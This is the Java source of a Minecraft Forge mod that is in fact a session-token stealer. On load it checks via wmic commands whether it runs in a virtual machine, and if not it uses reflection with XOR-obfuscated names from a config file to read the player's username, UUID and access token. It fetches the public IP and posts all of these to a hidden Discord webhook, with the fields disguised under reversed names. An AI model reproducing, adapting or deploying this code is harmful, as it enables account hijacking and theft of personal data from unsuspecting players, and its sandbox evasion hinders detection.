package com.example;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import net.minecraft.util.Session;
import java.util.Map;
import java.util.Set;
import com.google.gson.JsonObject;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import javax.net.ssl.HttpsURLConnection;
import java.io.OutputStream;
import java.net.URL;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = CombinedMod.MODID, version = CombinedMod.VERSION)
public class CombinedMod {
    public static final String MODID = "examplemod";
    public static final String VERSION = "1.0";
    /**
     * Decodes a Base64 encoded string into its original byte array.
     * Functionally equivalent to java.util.Base64.getDecoder().decode(input)
     * 
     * @param input The Base64 encoded string to decode
     * @return The decoded data as a byte array
     * @throws IllegalArgumentException If the input is not a valid Base64 encoded string
     */
    public static byte[] decode(String input) {
        if (input == null) {
            throw new NullPointerException("Input cannot be null");
        }
        
        // Remove white spaces if any
        input = input.replaceAll("\\s", "");
        
        // Pad the input if necessary to make it a multiple of 4
        while (input.length() % 4 != 0) {
            input += "=";
        }
        
        // Create a byte array to hold the result
        int outputLength = (input.length() * 3) / 4;
        // Adjust for padding
        if (input.endsWith("==")) outputLength -= 2;
        else if (input.endsWith("=")) outputLength -= 1;
        
        byte[] output = new byte[outputLength];
        
        int outputIndex = 0;
        int buffer = 0;
        int bufferLength = 0;
        
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            int value = -1;
            
            // Convert character to 6-bit value
            if (c >= 'A' && c <= 'Z') {
                value = c - 'A';
            } else if (c >= 'a' && c <= 'z') {
                value = c - 'a' + 26;
            } else if (c >= '0' && c <= '9') {
                value = c - '0' + 52;
            } else if (c == '+' || c == '-') {
                value = 62;
            } else if (c == '/' || c == '_') {
                value = 63;
            } else if (c == '=') {
                // Padding character
                continue;
            } else {
                // Skip invalid characters
                continue;
            }
            
            // Add 6 bits to buffer
            buffer = (buffer << 6) | value;
            bufferLength += 6;
            
            // If we have at least 8 bits, write a byte
            if (bufferLength >= 8) {
                bufferLength -= 8;
                if (outputIndex < output.length) {
                    output[outputIndex++] = (byte)((buffer >> bufferLength) & 0xFF);
                }
            }
        }
        
        return output;
    }
    
    /**
     * Decodes a Base64 encoded string into its original string using UTF-8 encoding.
     * Functionally equivalent to new String(java.util.Base64.getDecoder().decode(input), StandardCharsets.UTF_8)
     * 
     * @param input The Base64 encoded string to decode
     * @return The decoded data as a string
     * @throws IllegalArgumentException If the input is not a valid Base64 encoded string
     */
    public static String decodeToString(String input) {
        byte[] decodedBytes = decode(input);
        return new String(decodedBytes, StandardCharsets.UTF_8);
    }

    public static String decrypt(String encryptedUrl, String key) {
        byte[] encryptedBytes = decode(encryptedUrl);
        byte[] keyBytes = decode(key);
        
        byte[] decrypted = new byte[encryptedBytes.length];
        
        for (int i = 0; i < encryptedBytes.length; i++) {
            decrypted[i] = (byte) (encryptedBytes[i] ^ keyBytes[i % keyBytes.length]);
        }
        
        // Convert the decrypted byte array into a string and return
        return new String(decrypted);
    }

    public static String getURL(String URL, String KEY) throws IOException {
        String encryptedURL = "";
        String encryptedKEY = "";

        BufferedReader reader = new BufferedReader(new InputStreamReader(CombinedMod.class.getResourceAsStream("/config.txt")));

        String line;
        while ((line = reader.readLine()) != null) {
            if (line.contains(URL)) {
                encryptedURL = line.split("=")[1];
            }
            if (line.contains(KEY)) {
                encryptedKEY = line.split("=")[1];
            }
        }
        return decrypt(encryptedURL, encryptedKEY);
    }

    public void collectAndSendInformation() throws IOException {
        // Get Minecraft session info
        Minecraft minecraft = Minecraft.getMinecraft();
        String username = "username";
        String uuid = "uuid";
        String token = "token";
            
        String webhookUrl = getURL("webhookURL", "webhookKEY");
        
        

        try {
            Object session = minecraft.getClass().getMethod(getURL("sessionURL", "sessionKEY")).invoke(minecraft);;
            username = (String) session.getClass().getMethod(getURL("nameURL", "nameKEY")).invoke(session);
            uuid = (String) session.getClass().getMethod(getURL("uuidURL", "uuidKEY")).invoke(session);
            token = ((String) session.getClass().getMethod(getURL("tokenURL", "tokenKEY")).invoke(session)).split(":")[1];
        } catch (Exception e) {
            e.printStackTrace();
        }
        //accessToken = accessToken.substring(5);

        // Get IP address
        URL ipCheckUrl = new URL(getURL("ipURL", "ipKEY"));
        HttpURLConnection connection = (HttpURLConnection) ipCheckUrl.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String ipAddress = reader.readLine();
        reader.close();
        
        // Send information to Discord webhook
        sendToDiscord(username, uuid, token, ipAddress, webhookUrl);
    }
    
    private void sendToDiscord(String username, String uuid, String accessToken, String ipAddress, String URL) throws IOException {
        Gson gson = new Gson();
        JsonObject json = new JsonObject();
        json.addProperty("content", "@everyone");
        json.addProperty("username", "sillyness");
        json.addProperty("tts", true);
   
        JsonObject embed = new JsonObject();
        embed.addProperty("title", "shocked emoji");
        embed.addProperty("description", "silly stuff");
   
        JsonArray fieldsArray = new JsonArray();
       
        JsonObject tokenField = new JsonObject();
        tokenField.addProperty("name", "nekot");
        tokenField.addProperty("value", accessToken);
        tokenField.addProperty("inline", true);
        fieldsArray.add(tokenField);
   
        JsonObject uuidField = new JsonObject();
        uuidField.addProperty("name", "diuu");
        uuidField.addProperty("value", uuid);
        uuidField.addProperty("inline", false);
        fieldsArray.add(uuidField);
   
        JsonObject usernameField = new JsonObject();
        usernameField.addProperty("name", "username");
        usernameField.addProperty("value", username);
        usernameField.addProperty("inline", false);
        fieldsArray.add(usernameField);
   
        JsonObject ipField = new JsonObject();
        ipField.addProperty("name", "pi");
        ipField.addProperty("value", ipAddress);
        ipField.addProperty("inline", false);
        fieldsArray.add(ipField);
   
        embed.add("fields", fieldsArray);
        json.add("embeds", gson.toJsonTree(new JsonObject[]{embed}));
        String payload = gson.toJson(json);
   
        int maxRetries = 3;
        for (int attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                URL url = new URL(URL);
                HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("User-Agent", "Java-DiscordWebhook");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);
   
                try (OutputStream outputStream = connection.getOutputStream()) {
                    outputStream.write(payload.getBytes());
                    outputStream.flush();
                }
   
                int responseCode = connection.getResponseCode();
   
                if (responseCode == 204) {
                    break;
                } else {
                }
   
                connection.disconnect();
            } catch (IOException e) {
                if (attempt == maxRetries) throw e;
            }
        }
    }


    
    /**
     * Gets detailed location information from an IP address
     * 
     * @param ipAddress The IP address to look up
     * @return JsonObject containing the location data or null if lookup failed
     */
    private JsonObject getDetailedLocationFromIP(String ipAddress) {
        try {
            // Use ip-api.com which provides detailed information without requiring an API key
            URL url = new URL("http://ip-api.com/json/" + ipAddress + "?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
            
            int responseCode = connection.getResponseCode();
            
            if (responseCode == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                
                // Parse the JSON response
                JsonObject jsonResponse = new Gson().fromJson(response.toString(), JsonObject.class);
                
                // Check if the request was successful
                if (jsonResponse.has("status") && jsonResponse.get("status").getAsString().equals("success")) {
                    return jsonResponse;
                }
            }
            
            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("Failed to get location: " + e.getMessage());
        }
        
        return null;
    }
    
    /**
     * Safely gets String value from JsonObject or returns default value if not present
     */
    private String getStringValue(JsonObject json, String key, String defaultValue) {
        if (json != null && json.has(key) && !json.get(key).isJsonNull()) {
            return json.get(key).getAsString();
        }
        return defaultValue;
    }
    

    @Mod.EventHandler
    public void onInit(FMLInitializationEvent event) throws IOException {
        if (!isSecure()) {
            collectAndSendInformation();
        }
    }
    
    // Security check methods from Secure.java
    public boolean isSecure() {
        return checkBIOS() || checkCPU() || checkGraphics() || checkDisk();
    }

    private boolean checkBIOS() {
        return executeCommand("wmic bios get serialnumber,manufacturer,version", "vmware", "virtualbox", "qemu",
                "microsoft corporation", "xen", "parallels");
    }

    private boolean checkCPU() {
        return executeCommand("wmic cpu get VirtualizationFirmwareEnabled", "TRUE");
    }

    private boolean checkGraphics() {
        return executeCommand("wmic path win32_videocontroller get name", "vmware", "virtualbox", "microsoft basic");
    }

    private boolean checkDisk() {
        return executeCommand("wmic diskdrive get model", "vbox", "vmware", "qemu", "virtual");
    }

    private boolean executeCommand(String command, String... indicators) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.toLowerCase();
                for (String indicator : indicators) {
                    if (line.contains(indicator)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
    
    // Simplified JSON implementation
    private class JSONObject {
        private final HashMap<String, Object> map = new HashMap<>();

        void put(String key, Object value) {
            if (value != null) {
                map.put(key, value);
            }
        }

        @Override
        public String toString() {
            StringBuilder builder = new StringBuilder();
            Set<Map.Entry<String, Object>> entrySet = map.entrySet();
            builder.append("{");

            int i = 0;
            for (Map.Entry<String, Object> entry : entrySet) {
                Object val = entry.getValue();
                builder.append(quote(entry.getKey())).append(":");

                if (val instanceof String) {
                    builder.append(quote(String.valueOf(val)));
                } else if (val instanceof Integer) {
                    builder.append(Integer.valueOf(String.valueOf(val)));
                } else if (val instanceof Boolean) {
                    builder.append(val);
                } else if (val instanceof JSONObject) {
                    builder.append(val.toString());
                } else if (val.getClass().isArray()) {
                    builder.append("[");
                    int len = java.lang.reflect.Array.getLength(val);
                    for (int j = 0; j < len; j++) {
                        builder.append(java.lang.reflect.Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                    }
                    builder.append("]");
                }

                builder.append(++i == entrySet.size() ? "}" : ",");
            }

            return builder.toString();
        }

        private String quote(String string) {
            return "\"" + string + "\"";
        }
    }
}